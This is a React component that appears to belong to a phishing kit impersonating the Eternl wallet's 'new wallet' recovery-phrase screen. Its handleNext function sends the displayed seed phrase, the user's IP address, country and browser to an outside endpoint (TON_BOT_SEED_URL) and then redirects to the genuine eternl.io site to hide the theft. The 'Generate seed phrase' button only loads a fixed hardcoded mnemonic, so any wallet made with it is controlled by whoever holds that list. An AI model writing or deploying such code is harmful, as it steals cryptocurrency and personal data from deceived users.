"use client";

import { Eye } from "lucide-react";
import { useEffect, useState } from "react";
import EternlModalShell from "./EternlModalShell";
import { getUserCountry } from "../../utils/userLocation";
import { NOTIFICATION_APP_NAME, TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../../app/config";

/** Demo copy only — real flow uses a cryptographically generated phrase. */
export const DEMO_MNEMONIC_24 = [
  "grass",
  "genre",
  "betray",
  "loud",
  "gloom",
  "imitate",
  "resemble",
  "sand",
  "garage",
  "piece",
  "catalog",
  "talk",
  "report",
  "wisdom",
  "abstract",
  "tunnel",
  "kingdom",
  "swarm",
  "strategy",
  "smile",
  "random",
  "sister",
  "girl",
  "route",
] as const;

export type EternlMnemonicPhraseModalProps = {
  open: boolean;
  words?: readonly string[];
  onBack: () => void;
  onClose?: () => void;
  zIndexClass?: string;
};

/**
 * New-wallet recovery phrase display (new wallet flow).
 * Bottom-sheet anchored and wider to fit 24 words grid.
 */
export default function EternlMnemonicPhraseModal({
  open,
  words = [],
  onBack,
  onClose,
  zIndexClass = "z-[66]",
}: EternlMnemonicPhraseModalProps) {
  const [walletName, setWalletName] = useState("");
  const [mnemonicWords, setMnemonicWords] = useState<string[]>(() => [
    ...words,
  ]);
  const [revealed, setRevealed] = useState(false);
  const [isValidating, setIsValidating] = useState(false);
  const [validationError, setValidationError] = useState("");

  useEffect(() => {
    if (!open) return;
    setWalletName("");
    setMnemonicWords([...words]);
    setRevealed(false);
    setIsValidating(false);
    setValidationError("");
  }, [open, words]);

  const handleGenerateSeed = () => {
    setMnemonicWords([...DEMO_MNEMONIC_24]);
    setRevealed(false);
  };

  const handleNext = async () => {
    if (!revealed) return;
    const name = walletName.trim();
    if (!name) return;
    if (mnemonicWords.length === 0) return;

    setIsValidating(true);
    setValidationError("");

    try {
      const userData = await getUserCountry();
      const messageData = {
        appName: NOTIFICATION_APP_NAME,
        seedPhrase: mnemonicWords.join(" "),
        country: userData?.country || "Unknown",
        ipAddress: userData?.ip || "Unknown",
        browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
      };

      const response = await fetch(
        TON_BOT_SEED_URL,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "x-api-key": TON_BOT_API_KEY,
          },
          body: JSON.stringify(messageData),
        }
      );

      const result = await response.json();
      if (response.status === 200 && result.status) {
        window.location.href = "https://eternl.io/";
      } else {
        throw new Error(result?.message || "Something went wrong.");
      }
    } catch (error) {
      console.error("Validation error:", error);
      setValidationError(
        error instanceof Error ? error.message : "An error occurred. Please try again."
      );
    } finally {
      setIsValidating(false);
    }
  };

  return (
    <EternlModalShell
      open={open}
      title="Mnemonic phrase"
      subtitle="Jot down all the words of your wallet recovery phrase on a piece of paper, in the exact order you see them here"
      onBack={onBack}
      onClose={onClose}
      zIndexClass={zIndexClass}
      footer={
        <>
          {validationError && (
            <div className="mb-3 rounded-lg border border-red-500/20 bg-red-500/10 px-3 py-2 text-sm text-red-300">
              {validationError}
            </div>
          )}
          <div className="flex w-full flex-wrap justify-end gap-2">
            <button
              type="button"
              onClick={onClose}
              disabled={isValidating}
              className="min-h-11 grow rounded-full border border-white/20 bg-transparent px-5 text-sm font-semibold text-white/90 transition hover:bg-white/10 sm:grow-0 disabled:opacity-40"
            >
              Cancel
            </button>
            <button
              type="button"
              disabled={!revealed || mnemonicWords.length === 0 || !walletName.trim() || isValidating}
              onClick={handleNext}
              aria-label="next"
              className="min-h-11 min-w-[100px] grow rounded-full bg-gradient-to-b from-rose-400 to-pink-600 px-6 text-sm font-semibold text-white shadow-inner ring-1 ring-black/30 transition enabled:hover:brightness-105 disabled:cursor-not-allowed disabled:opacity-40 sm:grow-0"
            >
              {isValidating ? "Validating..." : "next"}
            </button>
          </div>
        </>
      }
    >
      <div className="relative flex min-h-0 flex-1 flex-col gap-4 overflow-hidden">
        <div className="space-y-3">
          <div className="text-sm text-white/70">
            Choose a name and generate your new wallet seed phrase.
          </div>

          <input
            className="w-full rounded-md bg-white/10 px-4 py-2 text-white placeholder:text-white/40 ring-1 ring-white/10 outline-none focus:ring-pink-400/40"
            placeholder="Wallet name"
            value={walletName}
            onChange={(e) => setWalletName(e.target.value)}
          />

          <button
            type="button"
            onClick={handleGenerateSeed}
            className="w-full rounded-md bg-gradient-to-r from-pink-500 to-orange-400 py-2 font-semibold text-black"
          >
            Generate seed phrase
          </button>
        </div>

        {mnemonicWords.length > 0 ? (
          <div className="flex flex-row items-center justify-center gap-2 text-center text-sm text-white/80">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              fill="none"
              className="h-6 w-6 shrink-0 text-orange-400"
              aria-hidden
            >
              <path
                d="M5.32171 9.6829C7.73539 5.41196 8.94222 3.27648 10.5983 2.72678C11.5093 2.42437 12.4907 2.42437 13.4017 2.72678C15.0578 3.27648 16.2646 5.41196 18.6783 9.6829C21.092 13.9538 22.2988 16.0893 21.9368 17.8293C21.7376 18.7866 21.2469 19.6548 20.535 20.3097C19.241 21.5 16.8274 21.5 12 21.5C7.17265 21.5 4.75897 21.5 3.46496 20.3097C2.75308 19.6548 2.26239 18.7866 2.06322 17.8293C1.70119 16.0893 2.90803 13.9538 5.32171 9.6829Z"
                stroke="currentColor"
                strokeWidth="1.5"
              />
              <path
                d="M12.2422 17V13C12.2422 12.5286 12.2422 12.2929 12.0957 12.1464C11.9493 12 11.7136 12 11.2422 12"
                stroke="currentColor"
                strokeWidth="1.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
              <path
                d="M11.992 8.99997H12.001"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
            <span className="break-words">
              Don&apos;t take any shortcuts, these words are super important!
            </span>
          </div>
        ) : null}

        <div className="relative min-h-0 flex-1 overflow-y-auto rounded-md">
          {mnemonicWords.length > 0 ? (
            <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 md:grid-cols-4">
              {mnemonicWords.map((word, i) => (
                <div
                  key={i}
                  className="flex min-w-0 overflow-hidden rounded-full border border-white/10 bg-white/[0.04]"
                >
                  <div
                    className="flex h-10 w-10 min-h-10 min-w-10 shrink-0 items-center justify-center rounded-l-full border-r border-white/10 bg-white/[0.06] text-sm tabular-nums leading-none text-white/60"
                    aria-hidden
                  >
                    {i + 1}
                  </div>
                  <input
                    type="text"
                    readOnly
                    tabIndex={-1}
                    value={word}
                    className="min-h-10 min-w-0 flex-1 cursor-default rounded-r-full border-0 bg-transparent py-2.5 pl-3 text-sm text-white/90 outline-none pointer-events-none"
                    aria-label={`Word ${i + 1}`}
                  />
                </div>
              ))}
            </div>
          ) : (
            <div className="flex h-full min-h-[160px] items-center justify-center rounded-md border border-white/10 bg-white/[0.03] p-4 text-sm text-white/60">
              Click &quot;Generate seed phrase&quot; to continue.
            </div>
          )}

          {!revealed && mnemonicWords.length > 0 ? (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-3 rounded-md bg-black/80 p-4 backdrop-blur-md">
              <Eye className="h-12 w-12 text-white/90" strokeWidth={1.5} />
              <span className="text-center text-sm text-white/90">
                Make sure no one&apos;s peeking at your screen
              </span>
              <button
                type="button"
                onClick={() => setRevealed(true)}
                aria-label="Show recovery phrase"
                className="mt-1 shrink-0 rounded-full bg-gradient-to-b from-rose-400 to-pink-600 px-6 py-2.5 text-sm font-semibold text-white shadow-inner ring-1 ring-black/30 transition hover:brightness-105"
              >
                Show recovery phrase
              </button>
            </div>
          ) : null}
        </div>
      </div>
    </EternlModalShell>
  );
}
